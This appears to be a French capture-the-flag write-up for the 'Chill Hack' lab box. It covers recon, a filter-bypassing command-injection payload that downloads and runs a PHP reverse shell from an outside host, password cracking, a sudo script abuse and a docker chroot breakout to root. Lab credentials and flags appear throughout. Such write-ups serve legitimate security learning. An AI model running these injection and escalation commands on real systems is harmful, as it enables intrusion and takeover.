# **Chill Hack**

---

## **Reconnaissance**

on nmap le server

on voit 3 port ouvert:

- 21: ftp
- 22: ssh
- 80: http

avec gobuster on trouve un  /secret qui nous permet d'entrer une commnande

## **21**

On accede au server ftp avec login:anonymous et pass: (le mot de passe est empty)

on ``get note.txt``:

```txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

donc go tester les posts et les champs ou on peut mettre des strings sur le site.

## **80**

on trouve dans /contact un form qui va surement nous permettre d'injecter une string dans une commande

il y a un filtre mais il est facilement bypassable ave ``\``

il faut capturer le post avec birpsuite pour plus de facilité

on ouvre un serveur http local sur lequel on met un reverse en php que l'on fait telecharger avec cette commande:

```bash
cd ../../../tmp %26%26 l\s %26%26 wget <http://10.10.163.21:8000/reverse.php>
```

(le telecharger dans le tmp pour avoir l'acces d'ecrire et de lire)

ensuite avec cette commande pour lancer le script

```bash
cd ../../../tmp %26%26 l\s %26%26 p\hp ./reverse.php
```

(les commande sont ecrit dans burpsuite d'ou les %26 = &)

une fois le reverse shell lancer on peut voir dans /home 3 utilisateurs:

```txt
anurodh
apaar
aurick
```

dans `/home/apaar` on a une note local.txt qui est surement le flag

dans /var/www/files il y a un file hacker.php ou l'on peut voir:

```html
<center>
 <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
 <h1 style="background-color:red;">You have reached this far. </h2>
 <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
```

on telecharge l'image `hacker-with-laptop_23-2147985341.jpg`
puis on l'analyse avec steghide

et dans le meme path on voit un index.php ou le mdp a l'air d'etre ecrit en clair avec `steghide extract -sf hacker-with-laptop_23-2147985341.jpg`

on se retrouve avec un backup.zip

si on essaye de unzip on recois ca:

```bash
root@ip-10-10-233-154:~/images# unzip backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password:
```

on crack le mdp avec johntheripper.

```bash
zip2john backup.zip > hash.txt
john hash.txt --wordlist=/root/Tools/wordlists/rockyou.txt
```

(utilisation tres basique de johntheripper)
on trouve le mdp ``pass1word``

on a donc acces a source_code.php qui a un mdp ecris en base64 ce qui nous donne:

```txt
Anurodh:!d0ntKn0wmYp@ssw0rd
```

grace a ces credentials on peut se connecter en ssh a anurodh `ssh anurodh@IP`

on a pu remarquer que dans apaar il y a un fichier ``.helpline.sh``

lorsque l'on tape `sudo -l` on obtient:

```bash
User anurodh may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

ce qui veut dire que l'on peut executer le script en tant que apaar et faire une horizontal privilege escalation

```bash
sudo -u apaar /home/apaar/.helpline.sh
```

ensuite on lui donne la commande ``/bin/bash`` et un bash spawn

on n'a plus qu'a ``cat`` le userflag

```txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

pour escalader ces privileges ensuites on remarque que anurodh a des droits docker lorsquee l'on fait `id` dans la console

```bash
dock image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              a24bb4013296        3 years ago         5.57MB
hello-world         latest              bf756fb1ae65        3 years ago         13.3kB

```

ensuite avec un Docker Breakout / Privilege Escalation on execute ``docker run -it -v /:/host/ alpine chroot /host/ bash``

ensuite on accede au proof.txt qui nous donne le flag:

```txt
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```

---

## **SQL**

dans /var/www/files on voit account.php les informations suivantes:

```php
...
$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
...
```

aussi dans account.php on trouve:

```php
...
$pw = hash("md5",$pw);
  $query = $this->con->prepare("SELECT * FROM users WHERE username='$un' AND password='$pw'");
...
```

les mot de passe sont hasher avec md5 dans la bdd

avec cette commande:

```bash
$ mysql -u root -p
Enter password: !@m+her00+@db
```

lorsque l'on essaye d'afficher les database avecc:

```sql
SHOW schemas;
```

on a:

```txt
Database
information_schema
mysql
performance_schema
sys
webportal
```

```sql
USE webportal
SELECT * FROM users
```

on obtient:

```txt
id firstname lastname username password
1 Anurodh Acharya Aurick 7e53614ced3640d5de23f111806cc4fd
2 Apaar Dahal cullapaar 686216240e5af30df0501e53c789a649
```

7e53614ced3640d5de23f111806cc4fd : masterpassword
686216240e5af30df0501e53c789a649 : dontaskdonttell

cullapaar:dontaskdonttell
Aurick:masterpassword

ces credentials ne servent pas a se connecter en ssh

---

## **Conclusion**

### **Flag 1**

Box: **4**

Temps passer 2 jour (~10h)

aide des writeups 2 :

1. trouver le fichier source_code.php (steg)
2. utiliser les droits de apaar pour executer .helpline.sh

point de blocage:

- ne pas oublier de faire un dirbuster/gobuster
- je suis partie a coter de la plaque alors que j'avais bien reperer le .helpline.sh j'aurais pu recuperer le flage depuis www-data
- bien analyser les fichier evident
- perdu du temps a rentrer dans la bdd sql
- bien penser a:
  - la steg
  - craquage pour les mdp

### **Flag 2*

aide des writeups 1 :

1. anurodh faisait partit du groupe docker
